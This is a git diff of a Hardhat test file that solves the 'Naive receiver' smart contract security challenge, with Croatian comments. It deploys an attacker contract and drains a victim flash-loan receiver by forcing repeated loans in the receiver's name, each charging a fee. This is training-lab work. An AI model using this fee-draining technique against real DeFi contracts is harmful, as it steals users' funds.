@@ -16,6 +16,7 @@ describe('[Challenge] Naive receiver', function () {
 
         const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
         const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);
+        const AttackerBonusSingleTransactionFactory = await ethers.getContractFactory('AttackerBonusSingleTransaction',attacker)
 
         this.pool = await LenderPoolFactory.deploy();
         await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
@@ -27,10 +28,39 @@ describe('[Challenge] Naive receiver', function () {
         await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
         
         expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
+
+        this.attackerContract=await AttackerBonusSingleTransactionFactory.deploy(this.pool.address);
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        //POSUDI OD pool CONTRACTA U IME RECEIVERA 0 ETH
+        //10 POZIVA -> PLATIT CEMO SVAKI PUT 1 ETHER FEE -> ISPRAZNJEN RACUN
+        //MANA OVOG PRISTUPA JE STA RADIMO 10 TRANSAKCIJA 
+        //BONUS -> NAPRAVI 1 TRANSKACIJU
+        //SITIMO SE -> TRANSKACIJA JE TRANSFER TOKENA ILI TRANSFER ETHA KADA JE SMART CONTRACT POZVAN OD STRANE EOA -> ACCOUNTA KOJI POTPISUJE S PRIVATE KEYEM
+        //DEPLOYAMO CONTRACT KOJEM PRISTUPAMO SAMO MI KAO NAPADAČ -> IZ NJEGA POZIVAMO 10 PUTA .flashLoan OD LENDERPOOL CONTRACTA
+        //NA OVI NAČIN IMAMO SAMO 1 TRANSAKCIJU NA BLOCKCHAINU->dio di mi pozivamo funkciju na smart contractu -> koji ce bit njeni from,to i value?
+        //1. način bez bonusa -> 10 transakcija
+/*         console.log('Pool adress')
+        console.log(this.pool.address)
+        console.log('Attacker adress')
+        console.log(attacker.address)
+        for(let i=0;i<10;i++)
+        {
+            let transHash=await this.pool.connect(attacker).flashLoan(this.receiver.address,ethers.utils.parseEther('0'))
+            console.log('Transaction '+(i+1))
+            console.log(transHash)
+            //from=napadac
+            //to=smart contract od poola
+            //value=0
+        } */
+        //2. način u 1 transakciji pozivamo kao napdac nas contract -> ostatak prepuštamo komunikaciji izmedu 2 smart contracta
+        const transhHash=await this.attackerContract.connect(attacker).drainBorrowerFunds(this.receiver.address)
+        console.log(transhHash)
+        //from=attacker
+        //to: adresa contracta
+        //value=0
+
     });
 
     after(async function () {
